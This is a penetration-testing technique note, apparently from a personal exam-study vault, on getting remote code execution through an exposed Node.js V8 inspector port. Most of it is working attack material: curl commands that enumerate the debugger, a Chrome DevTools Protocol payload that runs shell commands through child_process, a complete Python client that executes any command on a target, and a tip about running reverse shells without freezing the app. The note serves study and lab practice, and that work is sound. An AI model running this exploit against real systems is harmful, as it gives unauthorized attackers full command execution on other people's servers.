---
type: technique
tags: [ejpt:host-net-pentest]
tools: [curl]
cves: []
related: ["[[reverse-shells]]"]
---

# Node.js Inspector RCE

When a Node.js app is launched with `--inspect` (or worse, `--inspect=0.0.0.0:9229`), it exposes the **V8 inspector** — the Chrome DevTools Protocol (CDP) debugger — on port 9229 by default. If bound to a non-loopback interface, anyone who can reach it gets arbitrary JavaScript execution in the running process, i.e. unauthenticated RCE.

## Recognition

- `nmap -p-` shows `9229/tcp` with an *unknown* service (nmap has nothing to match CDP against — identify it yourself).
- The app is Node.js (Express/Next) — a strong hint that a debugger port might be in play.

## Workflow

1. Enumerate the HTTP layer of the inspector:
   ```sh
   curl -i http://TARGET:9229/json
   curl -i http://TARGET:9229/json/list
   ```
   This returns a JSON array of debug targets; the `webSocketDebuggerUrl` (`ws://…`) is the CDP entry point.
2. Connect a WebSocket client (Python `websockets`) and send a JSON-RPC `Runtime.evaluate` message:
   ```json
   {"id":1,"method":"Runtime.evaluate","params":{"expression":"…","returnByValue":true}}
   ```
3. Read the result from the response: `data["result"]["result"]["value"]`.

## Key payload

`require` is **not** a bare global in the inspector's global context — reach it via `process.mainModule.require`:

```js
process.mainModule.require('child_process').execSync('id').toString()
```

Minimal Python client (pass the command as `sys.argv[1]`):

```python
import asyncio, json, sys
from websockets.asyncio.client import connect

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
URI = "ws://TARGET:9229/<uuid>"

async def run():
    async with connect(URI) as ws:
        msg = {"id": 1, "method": "Runtime.evaluate",
               "params": {"expression":
                   f"process.mainModule.require('child_process').execSync({json.dumps(cmd)}).toString()",
                   "returnByValue": True}}
        await ws.send(json.dumps(msg))
        data = json.loads(await ws.recv())
        print(data["result"]["result"]["value"])

asyncio.run(run())
```

`json.dumps(cmd)` safely quotes the command inside the JS string (handles embedded quotes).

## Gotchas

- **`execSync` blocks** the Node event loop — fine for a quick command, but a reverse shell or any long-running job will freeze the app. Use async `exec()` (or `spawn`) instead ([[reverse-shells]]).
- `process.mainModule` is deprecated; if it's `undefined`, the response carries an `exceptionDetails` block — a different `require` path is needed.

## Seen in

[[autoescuela]]
